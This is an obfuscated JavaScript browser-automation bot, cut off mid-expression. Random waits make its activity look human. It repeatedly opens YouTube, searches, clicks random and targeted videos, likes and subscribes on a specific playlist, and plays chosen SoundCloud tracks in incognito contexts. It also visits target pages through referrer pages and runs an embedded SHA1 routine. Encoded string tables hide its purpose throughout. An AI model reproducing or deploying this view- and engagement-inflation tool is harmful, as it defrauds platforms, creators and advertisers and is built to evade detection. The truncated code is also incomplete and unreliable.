const a0 = d,
  Z = c,
  Y = b;

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x2 * 0x11fb + -0x20fa + -0x2fc);
    let h = e[f];
    if (b['kkShqI'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x11f0 + -0x1f5 * -0x5 + -0x1bb9, s, t, u = 0x2 * -0x111f + 0x1863 + 0x349 * 0x3; t = n['charAt'](u++); ~t && (s = r % (-0x3 * 0x123 + -0x1 * -0x1f45 + -0x1bd8) ? s * (-0x188f + -0xbcc + 0x249b) + t : t, r++ % (0xf31 * 0x1 + 0x3f9 + 0x13 * -0x102)) ? p += String['fromCharCode'](-0x1c * 0x8d + -0x2104 + 0x316f & s >> (-(0x3c + 0x65c + 0x34b * -0x2) * r & 0xbd9 * 0x2 + 0x53d + -0x3 * 0x9a3)) : -0x1 * 0x18c6 + 0xf34 + 0x992) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1 * -0x19e3 + 0x1 * -0x19f9 + 0x1 * 0x16, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1107 + -0x1ecb * -0x1 + 0x1 * -0x2fc2))['slice'](-(0x2f * 0x33 + 0x2 * -0x105d + 0x175f * 0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x272 * 0xa + -0xba0 + 0x1 * -0xcd4,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x6bb + -0x43 * 0x82 + 0x1b4b; u < 0x270 + -0x537 * -0x1 + -0x6a7; u++) {
          p[u] = u;
        }
        for (u = 0x1 * -0x226b + -0x1c0 + 0x242b; u < -0x73d + -0x2630 + 0x949 * 0x5; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x5 * 0x769 + -0x3c3 + -0x2 * 0x1025), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0xa7d * 0x3 + -0xc90 + 0x11 * 0x297, q = -0x161 * 0x11 + 0x1f2d + -0x7bc;
        for (let v = -0x13c0 + 0x58 * -0x2c + 0x30 * 0xba; v < n['length']; v++) {
          u = (u + (0xaf3 * 0x3 + 0x20d2 + -0x1 * 0x41aa)) % (-0x46 * 0x68 + 0x3e1 + 0x198f), q = (q + p[u]) % (0x5 * -0x28d + 0xb * -0x31d + 0x3000), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0xc91 + -0x1 * 0x1c09 + 0x1078)]);
        }
        return t;
      };
      b['jAEqJE'] = m, c = arguments, b['kkShqI'] = !![];
    }
    const j = e[0x219e + 0x4 * 0x841 + 0x1636 * -0x3],
      k = f + j,
      l = c[k];
    return !l ? (b['vpklcx'] === undefined && (b['vpklcx'] = !![]), h = b['jAEqJE'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x45 * 0x71 + -0x369 + -0x7 * 0x3dd))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x2fc + -0x188f + 0x1b8b), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x1ca * -0x41 + -0x5b25 * -0x1 + 0x53 * 0x1b7 + (-0x3e * 0xbf + -0x630c + 0xcbe6) * random()) : await standardWaitForNetIdle(f), await wait(0x3c + 0x65c + 0x170 * 0x9 + (0x2f63 * 0x1 + 0xa7a + -0x1 * 0x12cd) * random()), -0x1 * 0x18c6 + 0xf34 + 0x993;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x1 * -0x19e3 + 0x1 * -0x19f9 + 0x9 * 0x22e), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1107 + -0x1ecb * -0x1 + 0x1 * -0x2fd1;
}
async function randomWait() {
  return await wait(0x2f * 0x33 + 0x2 * -0x105d + 0x2ae5 * 0x1 + (0x272 * 0xa + -0xba0 + 0x1 * 0x6b4) * random()), 0x6bb + -0x43 * 0x82 + 0x1b4c;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = c;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + R(0xf) + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x270 + -0x537 * -0x1 + -0x7a7, 0x1 * -0x226b + -0x1c0 + 0x2432), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x56d9 + -0x1ca37 + 0x40f4 * 0xc) * getRandomInt(0x5 * 0x769 + -0x3c3 + -0x1e * 0x11c, -0xa7d * 0x3 + -0xc90 + 0x2 * 0x1606), h)), -0x161 * 0x11 + 0x1f2d + -0x7bb;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x13c0 + 0x58 * -0x2c + 0x30 * 0xba;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0xaf3 * 0x3 + 0x20d2 + -0x1 * 0x41aa]['split']('\x20');
    for (let k = -0x46 * 0x68 + 0x3e1 + 0x188f; k < i['length']; k += 0x5 * -0x28d + 0xb * -0x31d + 0x2f02)
      j += i[k] * h[i[k + (0xc91 + -0x1 * 0x1c09 + 0xf79)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x219e + 0x4 * 0x841 + 0x196 * -0x2a)['map'](l => Array['from'](l['children']))['flat'](0x1bc8 + 0x21f2 + 0xe5 * -0x45)['map'](l => l['childNodes'][-0x47 * -0xf + 0x10d6 + 0xa7f * -0x2]['childNodes'][0x1 * 0x1b44 + -0x962 + -0xe * 0x147]['childNodes'][0x20d9 + -0x5 * 0x707 + 0x24b * 0x1]['childNodes'][-0x18 * 0xf4 + -0x1e3a + 0x351a]['childNodes'][-0x89 * 0x3 + -0x5 * 0x3c1 + 0x1461]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x52 * 0xd + 0x1 * 0x1b4b + -0x1b8d, 0x2e3 * -0x1 + -0x1ddb + 0x3446)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0xf97 * 0x2 + -0x228 + 0x5bee);
  const h = await getMaxTime(f),
    i = Math['min']((-0x1b2e0 + -0x6cf + 0x2a40f) * getRandomInt(0x1a5 + -0x5a5 + -0x36 * -0x13, -0x268f + -0x225 * -0x9 + 0x1347), h);
  return await wait(i), -0x6d * -0x2f + -0x15 * 0xa3 + -0x6a3;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x2 * 0x11fb + -0x20fa + -0x2fc);
    let h = e[f];
    if (c['KHYYqL'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x11f0 + -0x1f5 * -0x5 + -0x1bb9, r, s, t = 0x2 * -0x111f + 0x1863 + 0x349 * 0x3; s = m['charAt'](t++); ~s && (r = q % (-0x3 * 0x123 + -0x1 * -0x1f45 + -0x1bd8) ? r * (-0x188f + -0xbcc + 0x249b) + s : s, q++ % (0xf31 * 0x1 + 0x3f9 + 0x13 * -0x102)) ? o += String['fromCharCode'](-0x1c * 0x8d + -0x2104 + 0x316f & r >> (-(0x3c + 0x65c + 0x34b * -0x2) * q & 0xbd9 * 0x2 + 0x53d + -0x3 * 0x9a3)) : -0x1 * 0x18c6 + 0xf34 + 0x992) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1 * -0x19e3 + 0x1 * -0x19f9 + 0x1 * 0x16, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1107 + -0x1ecb * -0x1 + 0x1 * -0x2fc2))['slice'](-(0x2f * 0x33 + 0x2 * -0x105d + 0x175f * 0x1));
        }
        return decodeURIComponent(p);
      };
      c['oUwjUg'] = i, b = arguments, c['KHYYqL'] = !![];
    }
    const j = e[0x272 * 0xa + -0xba0 + 0x1 * -0xcd4],
      k = f + j,
      l = b[k];
    return !l ? (h = c['oUwjUg'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const S = b;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math[S(0x13, 'YNuR')]() * h['length'])])['children'][-0x1b24 + 0x1dc9 + -0x1 * 0x2a5]['children'][0xd26 + -0x19c + 0xe * -0xd3]['children'][-0x2333 + -0xb7e + 0x1 * 0x2eb1]['children'][0x8a6 + 0x239b + -0x1 * 0x2c41]['children'][-0x7 * -0x165 + -0xeca + 0x507]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x17d8 + 0x205d + -0xe0d * 0x4;
}

function a() {
  const bp = [
    'yJahe8ondmoiuSo1tW',
    '\x20NT\x2010.0)\x20',
    'BZj5Dw5AuwXLEq',
    'slice',
    'https://gr',
    '.ytp-large',
    'nsyNW7LxW6BdRXNcLcu',
    'zs12AwrLBY1HBG',
    'nJe4mJG4mtC0yG',
    'C3vTzq',
    'charCodeAt',
    'close',
    'dtezWQyDW4FdOg8/W5y',
    't\x20story,mi',
    'tructors-1',
    'ywDLls1MAwXSlq',
    'lCkLar5mhspcK3u/',
    'W6NdS8ksbcP/W6/dU8oTW7m',
    'CxvPBgWTB3jN',
    'WRCPnCoCWOHd',
    'dToClick',
    'WP/cRb5/sCk3uSoBiZS',
    'WQBcVSk4wq',
    'Dw5Ky2XVDwqUyW',
    'ZyGS_AMbIa',
    'y3jHzNqSBwLUzq',
    'W7ZdTCoqjgdcHZOavSoU',
    'WQm9nCowWP4cjCoAq8oc',
    'strictions',
    'WQ3cMmo+WP3cPCk0emoFza',
    'Ahr0Chm6lY9NCG',
    'zs95B3v0DwjLlG'
  ];
  a = function() {
    return bp;
  };
  return a();
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x2 * 0x11fb + -0x20fa + -0x2fc);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x125d + 0x1 * 0x230b + -0x104a + (-0x151 * 0x7 + -0xd42 + 0x16ab * 0x1) * random()
  }), await wait(-0xba5 + -0xb3 * 0x19 + 0x1f14 + (0x151b + -0x1cf5 + 0xb * 0xd2) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const T = d,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1 * 0x1625 + -0xda0 + 0x883 * -0x1]['childNodes'][-0x221c + -0x1 * 0x63a + -0x1c1 * -0x17]['childNodes'][0x1ad * 0xd + -0x7db * -0x1 + -0x1da3]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x8bd * 0x1 + 0x89b + 0x3 * 0xd]['childNodes'][-0x906 + 0x1a69 + 0x1 * -0x1163]['childNodes'][-0x1 * 0x2570 + 0x9b + 0x1 * 0x24d7]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + T(0x14)), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0xbb5 * -0x1 + -0x22 * -0xbc + -0xd42),
          r = 0x1197 + 0x1 * 0x12df + -0x167 * 0x1a;
        for (let u = 0x1e7 * 0x5 + 0x18c5 + -0x2248; u < q['length']; u += 0x1c3 * 0x16 + 0x5ee * 0x6 + -0x4a54)
          r += q[u] * k[q[u + (-0xb8 * -0x23 + 0x1b2 * -0x11 + 0x139 * 0x3)]];
        return r;
      }(n);
  });
  await wait((-0xb42 + -0x33d2 + 0x79ac) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x2224 + 0x9839 + 0x744b) * getRandomInt(0x3b * 0x68 + 0xd96 * -0x2 + 0x1 * 0x335, 0x53b + -0x256d + 0x2 * 0x101e), h + (-0x3b2 * -0x4 + 0xe2 * 0x4 + 0x18 * 0xd));
  return await wait(i), 0x43 * 0x2 + -0x1b4c + 0x1ac7;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x176 + -0x60 * 0xc + 0x5f6), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        const U = d;
        document['querySelec' + 'tor'](U(0x5) + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x183d * -0x1 + -0x250d * 0x1 + -0x28 * -0x9d + (-0x7 * 0x2c7 + 0x1b23 * 0x1 + -0x5 * 0xc2) * Math['random']());
    });
  }, -0x139d + -0x10f5 + -0x71a * -0x9);
  await wait(0x39d37 + -0x8a27e + 0x673 * 0x17d);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x120ca + -0x4ec * 0x49 + 0x1be * 0xaf) * getRandomInt(0x136 + 0x61 * 0x38 + -0x166a, -0x1149 + -0x2193 + 0x32f5)), clearInterval(h), -0xce1 + 0x2077 + -0x9 * 0x22d;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x17c1 + 0x17f1 + 0x25 * -0x14a;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x162 + -0x1bf3 + 0x1d56;
    await randomWait();
  }
  return 0x22ef + -0x48d + -0x1e61;
}

function fetchRandomSC() {
  const V = c;
  return Math['random']() <= -0x157d + -0x1c77 + 0x31f4 + 0.5 ? 'https://so' + V(0x17) + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0xf2b * -0x1 + -0x3 * 0xb4e + -0x1 * -0x12bf + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const W = d;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x19 * 0xfa + 0x1b14 + 0x4e * -0xa9 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x1ade + -0x1e2f + 0x390d;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x2 * -0x891d + 0xcc28 + -0xf5da * -0x1 + getRandomInt(0x1 * -0x323d + -0x2a6a + -0x1f * -0x4e1, 0xaacb + 0x869 + -0x3e04));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1 * -0x936 + 0x167c + 0xd45 * -0x1), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1fcc + -0x6ad * -0x1 + 0x1 * -0x2679;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s[W(0xb)](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x2e6 * 0xd + -0x398 + 0x2946, -0x7ca * -0x1 + 0x7 * -0x43b + 0x1605)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x117c + -0x158f + 0xbe3 + floor((-0xbd7 * 0x1 + 0x20a3 + 0x439 * -0x4) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x173bccfc * 0xb + -0x127378f6 * -0x7 + 0x2 * 0x7f34c00d),
          0x592cc5 + -0x9932b5 * 0x1 + -0x7 * -0x1b6e90,
          0x40b3 + 0x1 * -0x7479 + 0xb3c6,
          -0x2 * 0x79d + -0x4e0 + 0x149a
        ], y = [
          0x1a75 + -0x948 * -0x1 + -0x23a5,
          -0x169b + -0x13d + 0x17e8,
          0x1829 + 0x1cf5 + -0x8d9 * 0x6,
          0xf4d + 0x2 * -0x56d + -0x473
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x2125 + -0xbf * -0xb + -0x5 * -0x4fd)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1cf3 * -0x1 + -0x238c + -0x1 * -0x407f; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x6 * 0xbb + -0x205c + 0x1bfa) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x198 + -0x2 * 0xa6a + 0x166c] = A[-0x5 * 0xa4 + 0x13 * 0x179 + -0x39 * 0x6f] = A[0x196d + 0xb27 + -0x3 * 0xc31] = A[0xbf5 * 0x1 + 0x2483 + -0x183b * 0x2] = A[-0x9fe + -0x1a1 * 0x5 + 0x1226 * 0x1] = A[0x270e + 0x859 * 0x4 + 0xfe * -0x49] = A[-0x2006 * 0x1 + -0x187a + 0x3885] = A[-0x1c60 + -0x628 + 0x1147 * 0x2] = A[-0xd * -0x18a + 0x7a5 * 0x3 + -0x2aea] = A[-0x19da * 0x1 + -0x11fd * 0x1 + 0xb * 0x3fd] = A[0x1f06 + -0x1 * -0x1779 + -0x2 * 0x1b3b] = A[-0x144f * -0x1 + -0x1 * 0x1c76 + 0x831] = A[-0xd7 * 0x28 + 0x11 * 0xa5 + 0x16ae] = A[-0x12f6 + -0x1 * -0x12d5 + 0x5 * 0x9] = A[-0x106d + 0x128c * -0x2 + 0x3592] = A[0x14ef + -0x1305 + -0x7 * 0x44] = A[-0x1cbd + 0x1 * 0xbcf + 0x10fd] = 0x196 + 0x1532 * 0x1 + -0x6 * 0x3cc, this['blocks'] = A) : this['blocks'] = [
                -0x6b9 * -0x1 + -0x2 * -0x1a3 + -0x9ff,
                0x1d9e + 0x2 * 0x66a + -0x2a72,
                -0x111b + 0xe65 * -0x1 + -0xfc * -0x20,
                -0x19 * -0x10a + 0x3b * 0x1 + -0x1a35,
                -0x8af + -0xe81 + 0x173 * 0x10,
                -0x249e + -0x3ab * 0x9 + 0x45a1,
                -0x91d * 0x2 + -0x1baa + 0x2de4,
                -0x323 * -0xc + -0x202a * -0x1 + 0x22e7 * -0x2,
                -0x1 * -0x1ee9 + -0xb53 * 0x3 + -0x62 * -0x8,
                -0x3 * 0x44d + -0x1 * 0x1e0d + 0x2 * 0x157a,
                0x8e * -0x43 + -0x17 * 0x63 + -0x1 * -0x2e0f,
                -0x733 + -0x1938 + -0xc1 * -0x2b,
                0x29 * -0x2 + 0x1b41 + -0x7 * 0x3d9,
                -0x808 + 0x1f9f + -0x1797 * 0x1,
                0x309 + -0x143 * -0x18 + -0x2151,
                0x14cb * 0x1 + -0xf9c + -0x52f * 0x1,
                0x8da * -0x3 + 0x23c2 + -0x934
              ], this['h0'] = 0x65ce0004 + -0x2 * 0x4ad27635 + -0x971c0f67 * -0x1, this['h1'] = -0x4102712a + 0x17fa30adc + 0xb42b44f * -0x7, this['h2'] = 0xf * 0x5805d33 + 0xf4de2858 + 0xaea8c157 * -0x1, this['h3'] = 0x1 * 0x1e0db40a + -0x1b750d2e + 0xcccdfa * 0x11, this['h4'] = -0x15d * 0x239601 + 0x140290da7 + -0x4bd2ac5a, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x7c2 + 0x17f1 + -0x102f, this['finalized'] = this['hashed'] = -0x15d3 + -0x1159 + 0x272c, this['first'] = 0x5 * -0x91 + 0x461 * -0x7 + -0x1 * -0x217d;
            }
            ['update'](J) {
              const X = d;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1 * -0x2319 + -0x18c8 + 0x3be1 * 0x1, O = J['length'] || 0x997 + 0x2 * 0xb30 + 0x31 * -0xa7, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x163f + 0x17f0 + -0x2e2f, P[-0x2 * -0xda6 + 0x413 * 0x1 + 0x3 * -0xa75] = this['block'], P[0x770 * -0x1 + 0x8 * -0x424 + 0x28a0] = P[0x1ae3 * 0x1 + -0x155 + -0x198d] = P[-0x79b + -0x1 * 0xa4b + 0xc * 0x17e] = P[0x2 * 0x236 + 0x110 + -0x1 * 0x579] = P[0x1 * 0x218f + 0x2 * 0x180 + -0x248b] = P[0x39 * 0x53 + -0x206b + 0xdf5] = P[0x1f82 + 0x1bc6 + 0x4a * -0xcd] = P[0x269a + -0xb * -0x27e + -0x41fd] = P[-0xad6 + -0x27 * -0xb9 + -0x1 * 0x1151] = P[-0x2ab * 0x1 + 0x5e1 + -0x32d * 0x1] = P[0x1 * -0xc5c + 0x206a + 0x16e * -0xe] = P[-0x44b * -0x4 + 0x8 * -0x50 + 0x5 * -0x2ed] = P[0x109d * -0x1 + 0xfd + -0x1 * -0xfac] = P[0x115e + -0x1b35 + -0x9e4 * -0x1] = P[0x2527 + -0x480 * -0x4 + -0x3719] = P[0x29c + -0xa7 * 0x1d + 0x105e] = 0x7 * 0x20b + -0x24a7 + 0x165a), K) {
                    for (N = this['start']; M < O && N < -0x2432 + -0x2527 * -0x1 + -0xb5; ++M)
                      P[N >> -0x8cb + -0xc6 + 0x993] |= J[M] << y[0x1 * -0x109d + -0x212d + 0x29f * 0x13 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x6cf + 0x2674 + -0x1f65; ++M)
                      (L = J[X(0xa)](M)) < 0xb * -0x16f + 0xe1b + 0x22a ? P[N >> 0x1a59 + 0x117a + -0x2bd1 * 0x1] |= L << y[-0x281 * 0xf + -0x2466 + -0x62a * -0xc & N++] : L < 0x13d4 + 0x1bb2 + -0x2786 ? (P[N >> -0x1844 + -0x2492 + -0x21 * -0x1d8] |= (0x9 * -0x42a + -0x1380 + 0x6 * 0x99f | L >> 0x27f * 0xb + -0x1 * -0x1c45 + -0x37b4) << y[-0x67d * 0x2 + 0x1 * -0x1f6a + 0x2c67 & N++], P[N >> -0x20 * -0x22 + -0x7f * -0x9 + -0x8b5] |= (0x173d + 0x1 * 0x12af + -0x296c | -0x57 * 0x11 + -0x59 * -0x6a + 0x1ed4 * -0x1 & L) << y[-0x2 * -0x175 + 0xf0b * 0x2 + 0x20fd * -0x1 & N++]) : L < 0x17d5 * -0xd + 0x45 * -0x2b + 0x21968 || L >= -0x1caf * -0x4 + -0xe28e * 0x1 + 0x14fd2 ? (P[N >> 0x3 * 0x92f + 0xc0b * 0x3 + 0x2 * -0x1fd6] |= (-0xfb5 + 0x3 * -0x5db + 0x1f * 0x11a | L >> 0x29 * -0xdd + -0x267e + -0x49ef * -0x1) << y[0x1 * -0x293 + 0x5 * 0x19 + 0x219 & N++], P[N >> 0x1ccf + 0x12ed + -0x2fba] |= (0x833 * 0x1 + 0x1d76 + -0x2529 | L >> 0x4 * -0x87f + 0x31 * 0x47 + 0x146b & -0x1453 + 0x205f + -0x13 * 0x9f) << y[0x1d76 + 0x1f08 + -0x3c7b & N++], P[N >> -0x1 * -0x1a2d + 0x7b8 + -0x1 * 0x21e3] |= (-0x2f9 * -0x1 + 0x2 * -0xedc + 0x1b3f | 0x1 * -0x1b56 + 0x7 * 0x63 + 0x638 * 0x4 & L) << y[0x7c4 + -0xb41 + 0x380 & N++]) : (L = 0x2f54 + -0x1c0c9 + 0x29175 + ((0x17 * 0x1 + 0x4 * 